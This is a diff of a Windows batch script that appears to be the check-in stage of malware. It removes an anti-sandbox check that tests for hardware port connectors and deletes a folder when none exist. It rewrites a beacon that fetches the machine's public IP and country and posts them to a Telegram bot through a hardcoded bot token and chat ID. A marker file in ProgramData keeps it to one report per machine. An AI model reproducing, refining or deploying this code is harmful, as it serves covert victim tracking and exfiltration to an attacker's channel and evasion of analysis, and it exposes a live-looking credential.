@@ -1,17 +1,14 @@
-powershell.exe -NoProfile -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\Comms') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
 rd /s /q "%ProgramData%\ssc"
 if exist "%ProgramData%\sent" exit /b
-chcp 65001 >nul
+chcp 65001 > nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
 set "CHAT_ID=-4955395962"
-set "IP=No IP"
-set "Country=No Country"
 
-for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
-    if not "%a"=="" set "Country=%a"
-    if not "%b"=="" set "IP=%b"
+for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($j.query + '|' + $j.country) } catch { Write-Host 'No IP|No Country' }"') do (
+    set "IP=%a"
+    set "Country=%b"
 )
 
-%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=TRF%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
+powershell -NoProfile -Command "$msg = 'TRF' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
 echo done > "%ProgramData%\sent"
 endlocal
